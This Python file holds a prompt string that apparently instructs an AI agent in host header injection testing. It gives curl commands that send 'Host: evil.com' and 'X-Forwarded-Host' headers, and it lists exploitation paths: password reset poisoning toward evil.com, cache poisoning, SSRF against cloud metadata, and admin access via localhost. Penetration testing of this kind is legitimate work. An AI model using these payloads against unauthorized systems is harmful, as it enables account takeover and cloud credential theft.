"""
Host Header Injection Attack Skill Prompt.
"""

HOST_HEADER_SKILL_PROMPT = """
## ATTACK SKILL: HOST HEADER INJECTION

### MANDATORY WORKFLOW

#### STEP 1: DETECTION
```bash
curl -H "Host: evil.com" https://TARGET/
curl -H "X-Forwarded-Host: evil.com" https://TARGET/
curl -H "Host: 127.0.0.1" https://TARGET/
```

#### STEP 2: EXPLOITATION
- Password reset poisoning: `Host: evil.com` -> reset link sent to evil.com
- Web cache poisoning: cache serves poisoned Host to other users
- SSRF: `Host: 169.254.169.254` -> hits cloud metadata
- Admin panel access: `Host: localhost`

#### ANTI-PATTERNS: Test BOTH Host and X-Forwarded-Host. Don't ignore password reset flows — they're the highest impact.
"""
